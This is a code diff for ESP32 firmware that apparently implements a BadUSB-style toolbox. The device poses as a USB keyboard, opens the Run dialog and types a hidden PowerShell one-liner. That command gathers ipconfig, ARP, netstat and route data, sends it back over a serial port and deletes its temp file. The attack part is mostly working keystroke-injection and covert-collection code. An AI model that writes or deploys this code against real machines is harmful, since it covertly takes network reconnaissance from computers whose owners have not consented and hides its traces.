@@ -1877,7 +1877,6 @@ static void badUsbStart() {
     // Init USB HID keyboard
     if (!s_usbKb) {
         s_usbKb = new USBHIDKeyboard();
-        USB.begin();
         s_usbKb->begin();
     }
 
@@ -1979,7 +1978,6 @@ static void drawBadUsb(TFT_eSPI& t, uint32_t now) {
 static void usbKeyboardStart() {
     if (!s_usbKb) {
         s_usbKb = new USBHIDKeyboard();
-        USB.begin();
         s_usbKb->begin();
     }
     Serial.println("[toolbox] USB keyboard mode active");
@@ -2583,38 +2581,57 @@ static void usbNetScanStart() {
     s_reconStageMs = millis();
     s_reconStatus = "Initializing USB HID...";
 
-    // Init USB HID keyboard
+    // Init USB HID keyboard — DON'T call USB.begin(), it resets CDC serial
     if (!s_usbKb) {
         s_usbKb = new USBHIDKeyboard();
-        USB.begin();
         s_usbKb->begin();
+        // Give host OS time to enumerate the new HID device
+        delay(1000);
     }
-    delay(500);
 
-    // Open hidden PowerShell — GUI+R, minimized + hidden window
+    // Find our COM port name to send results back
+    // We'll have PowerShell discover it and pipe results to it
     s_reconStatus = "Deploying recon agent...";
+
+    // Step 1: Open Run dialog
     s_usbKb->press(KEY_LEFT_GUI);
+    delay(50);
     s_usbKb->press('r');
+    delay(50);
     s_usbKb->releaseAll();
-    delay(800);
-    // Start PowerShell hidden with -WindowStyle Hidden
-    reconTypeCmd("powershell -WindowStyle Hidden -Command \"Start-Sleep -Milliseconds 500\"");
-    delay(2000);
-    // Now open another hidden PowerShell that does the real work
-    // and writes output to a temp file we can reference
-    s_usbKb->press(KEY_LEFT_GUI);
-    s_usbKb->press('r');
-    s_usbKb->releaseAll();
-    delay(800);
-    reconTypeCmd("powershell -WindowStyle Hidden -Command \""
-                 "$o=@(); "
-                 "$o+='=== IPCONFIG ==='; $o+=ipconfig; "
-                 "$o+='=== ARP TABLE ==='; $o+=arp -a; "
-                 "$o+='=== NETSTAT ==='; $o+=netstat -an | Select -First 50; "
-                 "$o+='=== ROUTE ==='; $o+=route print -4 | Select -First 30; "
-                 "$o | Out-File -Encoding ASCII $env:TEMP\\sqw_recon.txt; "
-                 "echo RECON_DONE\"");
-    delay(3000);
+    delay(1200);
+
+    // Step 2: Run a single hidden PowerShell that does ALL the work:
+    // - Runs recon commands (ipconfig, arp, netstat, route)
+    // - Saves to temp file
+    // - Finds the ESP32 COM port
+    // - Sends results back over serial
+    // - Cleans up
+    reconTypeCmd(
+        "powershell -WindowStyle Hidden -Command \""
+        "$r=@();"
+        "$r+='=IPCONFIG=';"
+        "$r+=ipconfig;"
+        "$r+='=ARP=';"
+        "$r+=arp -a;"
+        "$r+='=NETSTAT=';"
+        "$r+=netstat -an|select -first 40;"
+        "$r+='=ROUTE=';"
+        "$r+=route print -4|select -first 25;"
+        "$r|Out-File $env:TEMP\\sqw.txt -Enc ASCII;"
+        "Start-Sleep 1;"
+        "$cp=[System.IO.Ports.SerialPort]::GetPortNames()|?{$_ -match 'COM'};"
+        "foreach($c in $cp){"
+        "try{"
+        "$s=New-Object System.IO.Ports.SerialPort $c,115200;"
+        "$s.Open();"
+        "gc $env:TEMP\\sqw.txt|%{$s.WriteLine($_)};"
+        "$s.WriteLine('RECON_DONE');"
+        "$s.Close();"
+        "break}catch{}};"
+        "del $env:TEMP\\sqw.txt -Force -EA 0\""
+    );
+    delay(1000);
 
     s_reconStage = ReconStage::IPCONFIG;
     s_reconStageMs = millis();
@@ -2689,34 +2706,30 @@ static void parseHostLine(const String& line) {
 static void usbNetScanTick() {
     uint32_t now = millis();
 
-    // Stage machine — the hidden PowerShell writes to a temp file,
-    // then we type a hidden command to read it back over the serial port
-    if (s_reconStage == ReconStage::IPCONFIG && now - s_reconStageMs > 5000) {
-        // Recon script should be done by now — read results back
-        s_reconStatus = "Reading results...";
-        s_usbKb->press(KEY_LEFT_GUI);
-        s_usbKb->press('r');
-        s_usbKb->releaseAll();
-        delay(600);
-        // Find the COM port and send file contents to it
-        // This reads the recon file and sends each line over serial
-        reconTypeCmd("powershell -WindowStyle Hidden -Command \""
-                     "$p=[System.IO.Ports.SerialPort]::GetPortNames() | Select -First 1; "
-                     "if($p){ $s=New-Object System.IO.Ports.SerialPort $p,115200; "
-                     "$s.Open(); "
-                     "Get-Content $env:TEMP\\sqw_recon.txt | ForEach { $s.WriteLine($_) }; "
-                     "$s.WriteLine('RECON_DONE'); "
-                     "$s.Close(); "
-                     "Remove-Item $env:TEMP\\sqw_recon.txt -Force }\"");
-        s_reconStage = ReconStage::ARP_TABLE;  // waiting for data
-        s_reconStageMs = now;
-        s_usbNetCmds++;
-    }
-    if (s_reconStage == ReconStage::ARP_TABLE && now - s_reconStageMs > 8000) {
-        // Timeout — data should have arrived by now
-        s_reconStage = ReconStage::DONE;
-        if (s_reconLineCount > 0) s_reconStatus = String(s_reconLineCount) + " lines captured";
-        else s_reconStatus = "No data received (check COM port)";
+    // Wait for data from the hidden PowerShell
+    if (s_reconStage != ReconStage::DONE) {
+        // Check for completion marker
+        for (int i = 0; i < s_reconLineCount; i++) {
+            if (s_reconLines[i] == "RECON_DONE") {
+                s_reconStage = ReconStage::DONE;
+                s_reconStatus = String(s_reconLineCount - 1) + " lines captured";
+                s_reconLineCount--;  // remove the DONE marker
+                break;
+            }
+        }
+        // Timeout after 20 seconds
+        if (now - s_reconStageMs > 20000) {
+            s_reconStage = ReconStage::DONE;
+            if (s_reconLineCount > 0) {
+                s_reconStatus = String(s_reconLineCount) + " lines (partial)";
+            } else {
+                s_reconStatus = "Timeout — COM port may have reset";
+            }
+        } else if (s_reconLineCount > 0) {
+            char buf[32];
+            snprintf(buf, sizeof buf, "Receiving... %d lines", s_reconLineCount);
+            s_reconStatus = String(buf);
+        }
     }
 
     // Read any serial output from host (if echoed back)
